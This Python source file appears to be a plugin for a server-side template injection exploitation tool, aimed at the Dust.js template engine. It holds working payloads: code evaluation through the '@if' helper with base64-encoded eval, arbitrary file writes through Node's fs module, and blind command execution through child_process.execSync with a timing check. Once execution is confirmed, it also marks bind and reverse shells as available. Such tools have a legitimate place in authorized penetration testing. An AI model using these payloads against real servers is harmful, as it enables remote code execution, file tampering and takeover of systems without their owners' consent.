from utils.loggers import log
from plugins.languages import javascript
from utils import rand
from core import bash


class Dust(javascript.Javascript):
    header_type = "cat"
    def init(self):
        self.update_actions({
            'evaluate': {
                'call': 'inject',
                'evaluate': """{{@if cond="eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}"""
            },
            'write': {
                'call': 'evaluate',
                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                'truncate': """require('fs').writeFileSync('{path}', '')"""
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind': {
                'call': 'evaluate',
                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2] 
            }
        })

        self.set_contexts([
                # Text context, no closures. This covers also {%s} e.g. {{payload}} seems working.
                {'level': 0},
                # Block as {#key}{/key} and similar needs tag key name to be bypassed.
                # Comment blocks
                {'level': 1, 'prefix': '!}}]', 'suffix': '{!'},
            ])

    """
    This replace _detect_render() since there is no real rendered evaluation in Dust.
    """
    def _detect_dust(self):
        # Print what it's going to be tested
        log.log(23, f'{self.plugin} plugin is testing rendering')
        for prefix, suffix, wrapper in self._generate_contexts():
            payload = f'{rand.randstrings[0]}{{!qwe!}}' \
                      f'{{#x a="{rand.randstrings[2]}" b="{rand.randstrings[1]}"}}{{:else}}{{b}}{{a}}{{/x}}'
            expected = f'{rand.randstrings[0]}{rand.randstrings[1]}{rand.randstrings[2]}'
            header_rand = [rand.randint_n(10,4),rand.randint_n(10,4)]
            header = '{header[0]}{{!123!}}{header[1]}'
            trailer_rand = [rand.randint_n(10,4),rand.randint_n(10,4)]
            trailer = '{trailer[0]}{{!123!}}{trailer[1]}'
            if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                     trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper):
                self.set('header', '{header[0]}{{!123!}}{header[1]}')
                self.set('trailer', '{trailer[0]}{{!123!}}{trailer[1]}')
                self.set('prefix', prefix)
                self.set('suffix', suffix)
                self.set('wrapper', wrapper)
                self.set('engine', self.plugin.lower())
                self.set('language', self.language)
                return

    """
    Override detection phase to avoid render check
    """
    def detect(self):
        techniques = self.channel.args.get('technique')
        if 'R' in techniques:
            self._detect_dust()
            if self.get('engine'):
                log.log(21, f'{self.plugin} plugin has confirmed injection')
                # Clean up any previous unreliable render data
                self.delete('unreliable_render')
                self.delete('unreliable')
                # Further exploitation requires if helper, which has
                # been deprecated in version dustjs-helpers@1.5.0 .
                # Check if helper presence here.
                rand_A = rand.randstr_n(2)
                rand_B = rand.randstr_n(2)
                rand_C = rand.randstr_n(2)
                expected = rand_A + rand_B + rand_C
                if expected in self.inject(f'{rand_A}{{@if cond="1"}}{rand_B}{{/if}}{rand_C}'):
                    log.log(21, f"{self.plugin} plugin has confirmed the presence of dustjs 'if' helper <= 1.5.0")
                else:
                    log.log(22, f"{self.plugin} plugin has not found 'if' helper <= 1.5.0, evaluation is not possible.")
        if 'T' in techniques:
            # Blind inj must be checked also with confirmed rendering
            self._detect_blind()
            if self.get('blind'):
                log.log(21, f'{self.plugin} plugin has confirmed blind injection')
                # Clean up any previous unreliable render data
                self.delete('unreliable_render')
                self.delete('unreliable')
                # Set basic info
                self.set('engine', self.plugin.lower())
                self.set('language', self.language)
                # Set the environment
                self.blind_detected()

    def blind_detected(self):
        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)
        test_cmd_code = self.actions.get('execute_blind', {}).get('test_cmd')
        if test_cmd_code and self.execute_blind(test_cmd_code):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)
